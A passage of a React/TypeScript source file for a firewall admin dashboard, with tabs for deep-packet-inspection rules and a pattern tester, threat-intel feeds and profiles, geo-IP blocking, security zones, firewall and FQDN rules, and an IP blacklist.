                <td style={{ padding:"7px 12px" }}><Bdg label={r.action} color={r.action==="block"?"#ff4444":"#ffaa00"} sm/></td>
                <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#ff9900" }}>{r.hitCount}</td>
                <td style={{ padding:"7px 12px", display:"flex", gap:6 }}>
                  <button onClick={()=>upd.mutate({id:r.id,data:{enabled:!r.enabled}},{onSuccess:()=>refetch()})} style={{ background:r.enabled?"#00ff8811":"#22222222", border:`1px solid ${r.enabled?"#00ff8833":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{r.enabled?"ON":"OFF"}</button>
                  <button onClick={()=>del.mutate({id:r.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                </td>
              </tr>
            ))}</tbody>
          </table>
        </div>
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1, marginBottom:10 }}>Pattern Tester</div>
          <div style={{ display:"flex", gap:8, marginBottom:8 }}>
            <input value={form.pattern} onChange={e=>setForm(f=>({...f,pattern:e.target.value}))} placeholder="Regex pattern (e.g. UNION.+SELECT)..." style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
            <select value={form.patternType} onChange={e=>setForm(f=>({...f,patternType:e.target.value}))} style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px", color:"#ccc", fontSize:11, cursor:"pointer" }}>
              {["url","header","body","user-agent","host","method"].map(t=><option key={t}>{t}</option>)}
            </select>
          </div>
          <div style={{ display:"flex", gap:8 }}>
            <input value={testInput} onChange={e=>setTestInput(e.target.value)} placeholder="Test string..." style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"7px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
            <button onClick={()=>testPat.mutate({data:{pattern:form.pattern,patternType:form.patternType,testInput}},{onSuccess:(r)=>setTestResult(r as {matched?:boolean})})} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"7px 14px", cursor:"pointer", fontSize:11 }}>Test</button>
          </div>
          {testResult&&<div style={{ marginTop:8, padding:"7px 12px", borderRadius:6, background:testResult.matched?"#ff444422":"#00ff8822", color:testResult.matched?"#ff4444":"#00ff88", fontFamily:"monospace", fontSize:12 }}>{testResult.matched?"✗ BLOCKED — Pattern matched":"✓ ALLOWED — No match"}</div>}
        </div>
      </div>
      <div style={{ width:270, background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10 }}>
        <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>Add DPI Rule</div>
        {[{l:"Name",k:"name",ph:"SQL Injection Block"},{l:"Pattern (regex)",k:"pattern",ph:"UNION.+SELECT"},{l:"Description",k:"description",ph:"Optional..."}].map(f=>(
          <div key={f.k}>
            <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
            <input value={form[f.k as keyof typeof form]} onChange={e=>setForm(p=>({...p,[f.k]:e.target.value}))} placeholder={f.ph} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none", boxSizing:"border-box" }}/>
          </div>
        ))}
        {[{l:"Type",k:"patternType",opts:["url","header","body","user-agent","host","method"]},{l:"Action",k:"action",opts:["block","alert","log"]}].map(f=>(
          <div key={f.k}>
            <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
            <select value={form[f.k as keyof typeof form]} onChange={e=>setForm(p=>({...p,[f.k]:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>{f.opts.map(o=><option key={o}>{o}</option>)}</select>
          </div>
        ))}
        <button onClick={()=>create.mutate({data:{name:form.name,pattern:form.pattern,patternType:form.patternType as "url"|"header"|"body"|"user-agent"|"host"|"method",action:form.action as "block"|"alert"|"log",description:form.description}},{onSuccess:()=>{refetch();setForm({name:"",pattern:"",patternType:"url",action:"block",description:""});}})} disabled={!form.name||!form.pattern} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"8px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
          <Plus size={11} style={{ marginRight:5, verticalAlign:"middle" }}/>Add Rule
        </button>
      </div>
    </div>
  );
}

// ── Threat Intel ──────────────────────────────────────────────────────────
const HRC=[{code:"CN",name:"China"},{code:"RU",name:"Russia"},{code:"KP",name:"North Korea"},{code:"IR",name:"Iran"},{code:"SY",name:"Syria"},{code:"BY",name:"Belarus"},{code:"VE",name:"Venezuela"},{code:"CU",name:"Cuba"},{code:"MM",name:"Myanmar"},{code:"SD",name:"Sudan"},{code:"YE",name:"Yemen"},{code:"LY",name:"Libya"}];

function ThreatTab() {
  const { data: geo, refetch: rGeo } = useListGeoBlocks();
  const { data: feeds, refetch: rFeeds } = useListThreatFeeds();
  const { data: profiles } = useListThreatProfiles();
  const addGeo = useAddGeoBlock(); const rmGeo = useRemoveGeoBlock(); const updGeo = useUpdateGeoBlock();
  const sync = useSyncThreatFeed(); const updFeed = useUpdateThreatFeed();
  const apply = useApplyThreatProfile();
  const [applying, setApplying] = useState<string|null>(null);
  const [gi, setGi] = useState({ countryCode:"", countryName:"" });

  return (
    <div style={{ display:"flex", flexDirection:"column", gap:16 }}>
      {/* Threat Profiles */}
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:16 }}>
        <div style={{ fontSize:12, color:"#ffaa00", fontWeight:700, marginBottom:14 }}>One-Click Threat Profiles — Palo Alto · Fortinet · Check Point + ProxhqVPN Presets</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:10 }}>
          {(profiles?.profiles??[]).map(p=>(
            <div key={p.id} style={{ background:"#111", border:`1px solid ${p.color}33`, borderRadius:8, padding:12 }}>
              <div style={{ fontSize:12, fontWeight:700, color:p.color, marginBottom:3 }}>{p.name}</div>
              <div style={{ fontSize:9, color:"#555", marginBottom:6 }}>{p.vendor}</div>
              <div style={{ fontSize:10, color:"#444", marginBottom:8, lineHeight:1.5 }}>{p.description}</div>
              {(p.actions??[]).slice(0,3).map((a:string,i:number)=><div key={i} style={{ fontSize:9, color:"#444", display:"flex", gap:4, marginBottom:2 }}><span style={{color:p.color}}>▸</span>{a}</div>)}
              <div style={{ marginTop:8, marginBottom:8 }}><Bdg label={p.severity} color={p.color} sm/></div>
              <button onClick={async()=>{setApplying(p.id);try{await apply.mutateAsync({id:p.id});}catch{}setApplying(null);}} disabled={applying===p.id} style={{ width:"100%", background:p.color+"22", border:`1px solid ${p.color}44`, color:p.color, borderRadius:6, padding:"6px", cursor:"pointer", fontSize:10, fontFamily:"monospace" }}>
                {applying===p.id?"Applying...":"Apply Profile"}
              </button>
            </div>
          ))}
        </div>
      </div>
      <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:16 }}>
        {/* Threat Feeds */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#ff9900", fontWeight:700, marginBottom:10, display:"flex", alignItems:"center", gap:6 }}><Rss size={12}/>Threat Intelligence Feeds</div>
          {(feeds?.feeds??[]).map(f=>(
            <div key={f.id} style={{ background:"#111", borderRadius:6, padding:10, marginBottom:8 }}>
              <div style={{ display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:3 }}>
                <span style={{ fontSize:12, color:"#bbb" }}>{f.name}</span>
                <Bdg label={f.status} color={f.status==="synced"?"#00ff88":f.status==="error"?"#ff4444":"#888"} sm/>
              </div>
              <div style={{ fontSize:10, color:"#444", marginBottom:6 }}>{f.entryCount} entries · {f.lastSyncedAt?new Date(f.lastSyncedAt).toLocaleString():"Never synced"}</div>
              <div style={{ display:"flex", gap:6 }}>
                <button onClick={()=>updFeed.mutate({id:f.id,data:{enabled:!f.enabled}},{onSuccess:()=>rFeeds()})} style={{ background:f.enabled?"#00ff8811":"#22222222", border:`1px solid ${f.enabled?"#00ff8833":"#333"}`, color:f.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{f.enabled?"ON":"OFF"}</button>
                <button onClick={()=>sync.mutate({id:f.id},{onSuccess:()=>rFeeds()})} style={{ background:"#44aaff11", border:"1px solid #44aaff33", color:"#44aaff", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9 }}><RefreshCw size={9}/></button>
              </div>
            </div>
          ))}
        </div>
        {/* Geo-IP */}
        <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14 }}>
          <div style={{ fontSize:11, color:"#4488ff", fontWeight:700, marginBottom:10, display:"flex", alignItems:"center", gap:6 }}><Globe2 size={12}/>Geo-IP Blocking ({geo?.enabledCount}/{geo?.total})</div>
          <div style={{ display:"flex", gap:6, marginBottom:8 }}>
            <input value={gi.countryCode} onChange={e=>setGi(g=>({...g,countryCode:e.target.value.toUpperCase().slice(0,2)}))} placeholder="XX" style={{ width:44, background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 6px", color:"#ccc", fontFamily:"monospace", fontSize:11, textAlign:"center", outline:"none" }}/>
            <input value={gi.countryName} onChange={e=>setGi(g=>({...g,countryName:e.target.value}))} placeholder="Country name..." style={{ flex:1, background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 8px", color:"#ccc", fontSize:11, outline:"none" }}/>
            <button onClick={()=>addGeo.mutate({data:{countryCode:gi.countryCode,countryName:gi.countryName}},{onSuccess:()=>{rGeo();setGi({countryCode:"",countryName:""}); }})} style={{ background:"#4488ff22", border:"1px solid #4488ff44", color:"#4488ff", borderRadius:6, padding:"6px 8px", cursor:"pointer" }}><Plus size={11}/></button>
          </div>
          <div style={{ display:"flex", flexWrap:"wrap", gap:4, marginBottom:8 }}>
            {HRC.filter(c=>!(geo?.blocks??[]).find(b=>b.countryCode===c.code)).slice(0,8).map(c=>(
              <button key={c.code} onClick={()=>addGeo.mutate({data:{countryCode:c.code,countryName:c.name}},{onSuccess:()=>rGeo()})} style={{ background:"#ff444411", border:"1px solid #ff444433", color:"#ff4444", borderRadius:3, padding:"2px 7px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>+{c.code}</button>
            ))}
          </div>
          <div style={{ maxHeight:240, overflow:"auto", display:"flex", flexDirection:"column", gap:5 }}>
            {(geo?.blocks??[]).map(b=>(
              <div key={b.id} style={{ display:"flex", alignItems:"center", gap:8, background:"#111", borderRadius:5, padding:"6px 10px" }}>
                <span style={{ fontFamily:"monospace", fontSize:11, color:"#666", width:26 }}>{b.countryCode}</span>
                <span style={{ flex:1, fontSize:11, color:"#bbb" }}>{b.countryName}</span>
                <span style={{ fontSize:10, color:"#ff9900", fontFamily:"monospace" }}>{b.hitCount}</span>
                <button onClick={()=>updGeo.mutate({id:b.id,data:{enabled:!b.enabled}},{onSuccess:()=>rGeo()})} style={{ background:b.enabled?"#ff444422":"#22222222", border:`1px solid ${b.enabled?"#ff444444":"#333"}`, color:b.enabled?"#ff4444":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{b.enabled?"BLOCKED":"OFF"}</button>
                <button onClick={()=>rmGeo.mutate({id:b.id},{onSuccess:()=>rGeo()})} style={{ background:"none", border:"none", color:"#333", cursor:"pointer", padding:0 }}><Trash2 size={9}/></button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Zones ─────────────────────────────────────────────────────────────────
function ZonesTab() {
  const { data, refetch } = useListFirewallZones();
  const create = useCreateFirewallZone(); const del = useDeleteFirewallZone(); const upd = useUpdateFirewallZone();
  const [form, setForm] = useState({ name:"", trustLevel:"untrusted", interfaces:"", description:"" });
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 270px", gap:16 }}>
      <div>
        <div style={{ fontSize:12, color:"#cc44ff", fontWeight:700, marginBottom:12 }}>Security Zones — {data?.total??0} Configured</div>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:12 }}>
          {(data?.zones??[]).map(z=>(
            <div key={z.id} style={{ background:"#0a0a0a", border:`1px solid ${z.color}33`, borderRadius:8, padding:14 }}>
              <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:6 }}>
                <div style={{ width:8, height:8, borderRadius:"50%", background:z.color }}/>
                <span style={{ fontWeight:700, fontSize:13, color:z.color }}>{z.name}</span>
                <Bdg label={z.trustLevel} color={TRUST_COLOR[z.trustLevel]??z.color} sm/>
              </div>
              {z.description&&<div style={{ fontSize:10, color:"#444", marginBottom:8 }}>{z.description}</div>}
              {z.interfaces&&<div style={{ fontSize:10, color:"#333", fontFamily:"monospace", marginBottom:8 }}>iface: {z.interfaces}</div>}
              <div style={{ display:"flex", gap:10, marginBottom:8 }}>
                <div><div style={{ fontSize:9, color:"#444" }}>Inbound</div><Bdg label={z.inboundPolicy} color={z.inboundPolicy==="allow"?"#00ff88":"#ff4444"} sm/></div>
                <div><div style={{ fontSize:9, color:"#444" }}>Outbound</div><Bdg label={z.outboundPolicy} color={z.outboundPolicy==="allow"?"#00ff88":"#ff4444"} sm/></div>
              </div>
              <div style={{ display:"flex", gap:6 }}>
                <button onClick={()=>upd.mutate({id:z.id,data:{inboundPolicy:z.inboundPolicy==="allow"?"deny":"allow"}},{onSuccess:()=>refetch()})} style={{ flex:1, background:"#111", border:"1px solid #333", color:"#666", borderRadius:4, padding:"4px 8px", cursor:"pointer", fontSize:10 }}>Toggle Inbound</button>
                <button onClick={()=>del.mutate({id:z.id},{onSuccess:()=>refetch()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:4, padding:"4px 7px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={9}/></button>
              </div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
        <div style={{ fontSize:10, color:"#444", textTransform:"uppercase", letterSpacing:1 }}>Add Zone</div>
        {[{l:"Name",k:"name",ph:"WireGuard Peers"},{l:"Interfaces",k:"interfaces",ph:"wg0,wg1"},{l:"Description",k:"description",ph:"Optional..."}].map(f=>(
          <div key={f.k}>
            <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
            <input value={form[f.k as keyof typeof form]} onChange={e=>setForm(p=>({...p,[f.k]:e.target.value}))} placeholder={f.ph} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none", boxSizing:"border-box" }}/>
          </div>
        ))}
        <div>
          <div style={{ fontSize:10, color:"#444", marginBottom:3 }}>Trust Level</div>
          <select value={form.trustLevel} onChange={e=>setForm(p=>({...p,trustLevel:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>
            {["trusted","untrusted","dmz","management"].map(t=><option key={t}>{t}</option>)}
          </select>
        </div>
        <button onClick={()=>create.mutate({data:{name:form.name,trustLevel:form.trustLevel as "trusted"|"untrusted"|"dmz"|"management",interfaces:form.interfaces,description:form.description}},{onSuccess:()=>{refetch();setForm({name:"",trustLevel:"untrusted",interfaces:"",description:""});}})} disabled={!form.name} style={{ background:"#cc44ff22", border:"1px solid #cc44ff44", color:"#cc44ff", borderRadius:6, padding:"8px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
          <Plus size={11} style={{ marginRight:5, verticalAlign:"middle" }}/>Add Zone
        </button>
      </div>
    </div>
  );
}

// ── Rules ─────────────────────────────────────────────────────────────────
function RulesTab() {
  const { data: rData, refetch: rR } = useListFirewallRules();
  const { data: fData, refetch: rF } = useListFqdnRules();
  const { data: conflicts, mutate: chk } = useCheckRuleConflicts();
  const cR = useCreateFirewallRule(); const dR = useDeleteFirewallRule(); const uR = useUpdateFirewallRule();
  const cF = useCreateFqdnRule(); const dF = useDeleteFqdnRule(); const uF = useUpdateFqdnRule();
  const [sec, setSec] = useState<"rules"|"fqdn">("rules");
  const [rf, setRf] = useState({ name:"", direction:"inbound", action:"deny", protocol:"tcp", destPort:"" });
  const [ff, setFf] = useState({ domain:"", action:"block", direction:"both" });
  return (
    <div style={{ display:"flex", flexDirection:"column", gap:12 }}>
      <div style={{ display:"flex", gap:8, alignItems:"center" }}>
        {(["rules","fqdn"] as const).map(s=>(
          <button key={s} onClick={()=>setSec(s)} style={{ background:sec===s?"#00ff8822":"#111", border:`1px solid ${sec===s?"#00ff8844":"#333"}`, color:sec===s?"#00ff88":"#555", borderRadius:6, padding:"6px 12px", cursor:"pointer", fontSize:10, fontFamily:"monospace", textTransform:"uppercase" }}>
            {s==="rules"?`Standard Rules (${rData?.total??0})`:`FQDN Rules (${fData?.total??0})`}
          </button>
        ))}
        <button onClick={()=>chk()} style={{ marginLeft:"auto", background:"#ffaa0011", border:"1px solid #ffaa0033", color:"#ffaa00", borderRadius:6, padding:"6px 12px", cursor:"pointer", fontSize:10, fontFamily:"monospace", display:"flex", alignItems:"center", gap:5 }}>
          <AlertTriangle size={10}/>Check Conflicts
        </button>
      </div>
      {conflicts&&(
        <div style={{ background:conflicts.clean?"#00ff8811":"#ff440011", border:`1px solid ${conflicts.clean?"#00ff8833":"#ff440033"}`, borderRadius:8, padding:12 }}>
          {conflicts.clean?<div style={{ color:"#00ff88", fontSize:12 }}>✓ No conflicts — ruleset is clean</div>:(
            (conflicts.conflicts??[]).map((c:{type?:string;rule1?:string;description?:string;severity?:string},i:number)=>(
              <div key={i} style={{ marginBottom:6, display:"flex", gap:8, alignItems:"center" }}>
                <Bdg label={c.type??""} color={c.severity==="critical"?"#ff2244":c.severity==="high"?"#ff6600":"#ffaa00"} sm/>
                <span style={{ fontSize:11, color:"#888" }}>{c.description}</span>
              </div>
            ))
          )}
        </div>
      )}
      {sec==="rules"?(
        <div style={{ display:"grid", gridTemplateColumns:"1fr 270px", gap:12 }}>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:440 }}>
            <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
              <thead><tr style={{ borderBottom:"1px solid #1a1a1a" }}>{["#","Name","Dir","Action","Protocol","Port","Hits",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
              <tbody>{(rData?.rules??[]).map(r=>(
                <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.45 }}>
                  <td style={{ padding:"7px 12px", color:"#444", fontFamily:"monospace", fontSize:10 }}>{r.priority}</td>
                  <td style={{ padding:"7px 12px", color:"#bbb" }}>{r.name}</td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.direction} color="#44aaff" sm/></td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.action} color={r.action==="allow"?"#00ff88":"#ff4444"} sm/></td>
                  <td style={{ padding:"7px 12px", color:"#666", fontFamily:"monospace" }}>{r.protocol}</td>
                  <td style={{ padding:"7px 12px", color:"#666", fontFamily:"monospace" }}>{r.destPort??"any"}</td>
                  <td style={{ padding:"7px 12px", color:"#ff9900", fontFamily:"monospace" }}>{r.hitCount}</td>
                  <td style={{ padding:"7px 12px", display:"flex", gap:5 }}>
                    <button onClick={()=>uR.mutate({id:r.id,data:{enabled:!r.enabled}},{onSuccess:()=>rR()})} style={{ background:r.enabled?"#00ff8811":"#22222222", border:`1px solid ${r.enabled?"#00ff8833":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{r.enabled?"ON":"OFF"}</button>
                    <button onClick={()=>dR.mutate({id:r.id},{onSuccess:()=>rR()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                  </td>
                </tr>
              ))}</tbody>
            </table>
          </div>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
            <div style={{ fontSize:10, color:"#444", textTransform:"uppercase" }}>Add Rule</div>
            <input value={rf.name} onChange={e=>setRf(p=>({...p,name:e.target.value}))} placeholder="Rule name..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
            {[{l:"Direction",k:"direction",opts:["inbound","outbound","both"]},{l:"Action",k:"action",opts:["allow","deny","drop","reject","log"]},{l:"Protocol",k:"protocol",opts:["tcp","udp","icmp","any"]}].map(f=>(
              <div key={f.k}><div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
                <select value={rf[f.k as keyof typeof rf]} onChange={e=>setRf(p=>({...p,[f.k]:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>{f.opts.map(o=><option key={o}>{o}</option>)}</select>
              </div>
            ))}
            <input value={rf.destPort} onChange={e=>setRf(p=>({...p,destPort:e.target.value}))} placeholder="Dest port (optional)..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
            <button onClick={()=>cR.mutate({data:{name:rf.name,direction:rf.direction as "inbound"|"outbound"|"both",action:rf.action as "allow"|"deny"|"drop"|"reject"|"masquerade"|"log",protocol:rf.protocol as "tcp"|"udp"|"icmp"|"any",destPort:rf.destPort||undefined}},{onSuccess:()=>{rR();setRf({name:"",direction:"inbound",action:"deny",protocol:"tcp",destPort:""});}})} disabled={!rf.name} style={{ background:"#00ff8822", border:"1px solid #00ff8844", color:"#00ff88", borderRadius:6, padding:"7px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
              <Plus size={10} style={{ marginRight:4, verticalAlign:"middle" }}/>Add Rule
            </button>
          </div>
        </div>
      ):(
        <div style={{ display:"grid", gridTemplateColumns:"1fr 270px", gap:12 }}>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:440 }}>
            <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
              <thead><tr style={{ borderBottom:"1px solid #1a1a1a" }}>{["Domain","Action","Direction","Priority","Hits",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
              <tbody>{(fData?.rules??[]).map(r=>(
                <tr key={r.id} style={{ borderBottom:"1px solid #0d0d0d", opacity:r.enabled?1:0.45 }}>
                  <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#bbb" }}>{r.domain}</td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.action} color={r.action==="allow"?"#00ff88":"#ff4444"} sm/></td>
                  <td style={{ padding:"7px 12px" }}><Bdg label={r.direction} color="#44aaff" sm/></td>
                  <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#555" }}>{r.priority}</td>
                  <td style={{ padding:"7px 12px", color:"#ff9900", fontFamily:"monospace" }}>{r.hitCount}</td>
                  <td style={{ padding:"7px 12px", display:"flex", gap:5 }}>
                    <button onClick={()=>uF.mutate({id:r.id,data:{enabled:!r.enabled}},{onSuccess:()=>rF()})} style={{ background:r.enabled?"#00ff8811":"#22222222", border:`1px solid ${r.enabled?"#00ff8833":"#333"}`, color:r.enabled?"#00ff88":"#444", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>{r.enabled?"ON":"OFF"}</button>
                    <button onClick={()=>dF.mutate({id:r.id},{onSuccess:()=>rF()})} style={{ background:"none", border:"1px solid #ff444433", borderRadius:3, padding:"2px 5px", cursor:"pointer", color:"#ff4444" }}><Trash2 size={8}/></button>
                  </td>
                </tr>
              ))}</tbody>
            </table>
          </div>
          <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
            <div style={{ fontSize:10, color:"#444", textTransform:"uppercase" }}>Add FQDN Rule</div>
            <input value={ff.domain} onChange={e=>setFf(p=>({...p,domain:e.target.value}))} placeholder="*.tracking.com or exact.domain.com" style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
            {[{l:"Action",k:"action",opts:["allow","block"]},{l:"Direction",k:"direction",opts:["both","inbound","outbound"]}].map(f=>(
              <div key={f.k}><div style={{ fontSize:10, color:"#444", marginBottom:3 }}>{f.l}</div>
                <select value={ff[f.k as keyof typeof ff]} onChange={e=>setFf(p=>({...p,[f.k]:e.target.value}))} style={{ width:"100%", background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px", color:"#ccc", fontSize:11, cursor:"pointer" }}>{f.opts.map(o=><option key={o}>{o}</option>)}</select>
              </div>
            ))}
            <button onClick={()=>cF.mutate({data:{domain:ff.domain,action:ff.action as "allow"|"block",direction:ff.direction as "both"|"inbound"|"outbound"}},{onSuccess:()=>{rF();setFf({domain:"",action:"block",direction:"both"});}})} disabled={!ff.domain} style={{ background:"#44aaff22", border:"1px solid #44aaff44", color:"#44aaff", borderRadius:6, padding:"7px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
              <Plus size={10} style={{ marginRight:4, verticalAlign:"middle" }}/>Add FQDN Rule
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

// ── Blacklist ─────────────────────────────────────────────────────────────
function BlacklistTab() {
  const { data, refetch } = useListBlockedIps();
  const block = useBlockIp(); const unblock = useUnblockIp();
  const [form, setForm] = useState({ ip:"", reason:"", exp:"" });
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 260px", gap:16 }}>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, overflow:"auto", maxHeight:560 }}>
        <div style={{ padding:"10px 14px", borderBottom:"1px solid #1a1a1a", fontSize:11, color:"#ff4444", fontWeight:700 }}>Blocked IPs — {data?.total??0}</div>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:11 }}>
          <thead><tr style={{ borderBottom:"1px solid #111" }}>{["IP","Reason","Auto","Hits","Blocked At",""].map(h=><th key={h} style={{ padding:"8px 12px", textAlign:"left", color:"#444", fontSize:10, textTransform:"uppercase" }}>{h}</th>)}</tr></thead>
          <tbody>{(data?.blockedIps??[]).map(b=>(
            <tr key={b.id} style={{ borderBottom:"1px solid #0d0d0d" }}>
              <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#ff4444" }}>{b.ip}</td>
              <td style={{ padding:"7px 12px", color:"#666", maxWidth:220, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{b.reason}</td>
              <td style={{ padding:"7px 12px" }}>{b.autoBlocked?<Bdg label="Auto" color="#ffaa00" sm/>:<Bdg label="Manual" color="#555" sm/>}</td>
              <td style={{ padding:"7px 12px", fontFamily:"monospace", color:"#ff9900" }}>{b.hitCount}</td>
              <td style={{ padding:"7px 12px", color:"#444", fontSize:10 }}>{new Date(b.blockedAt).toLocaleString()}</td>
              <td style={{ padding:"7px 12px" }}><button onClick={()=>unblock.mutate({id:b.id},{onSuccess:()=>refetch()})} style={{ background:"#00ff8811", border:"1px solid #00ff8833", color:"#00ff88", borderRadius:3, padding:"2px 8px", cursor:"pointer", fontSize:9, fontFamily:"monospace" }}>Unblock</button></td>
            </tr>
          ))}</tbody>
        </table>
      </div>
      <div style={{ background:"#0a0a0a", border:"1px solid #1a1a1a", borderRadius:8, padding:14, display:"flex", flexDirection:"column", gap:10, alignSelf:"start" }}>
        <div style={{ fontSize:10, color:"#444", textTransform:"uppercase" }}>Block IP</div>
        <input value={form.ip} onChange={e=>setForm(p=>({...p,ip:e.target.value}))} placeholder="1.2.3.4 or CIDR..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontFamily:"monospace", fontSize:11, outline:"none" }}/>
        <input value={form.reason} onChange={e=>setForm(p=>({...p,reason:e.target.value}))} placeholder="Reason..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
        <input value={form.exp} onChange={e=>setForm(p=>({...p,exp:e.target.value}))} placeholder="Expires in (min, optional)..." style={{ background:"#111", border:"1px solid #333", borderRadius:6, padding:"6px 10px", color:"#ccc", fontSize:11, outline:"none" }}/>
        <button onClick={()=>block.mutate({data:{ip:form.ip,reason:form.reason,expiresInMinutes:form.exp?parseInt(form.exp):undefined}},{onSuccess:()=>{refetch();setForm({ip:"",reason:"",exp:""});}})} disabled={!form.ip||!form.reason} style={{ background:"#ff444422", border:"1px solid #ff444444", color:"#ff4444", borderRadius:6, padding:"8px", cursor:"pointer", fontSize:11, fontFamily:"monospace" }}>
          <Ban size={10} style={{ marginRight:5, verticalAlign:"middle" }}/>Block IP
        </button>
      </div>
    </div>
  );
}

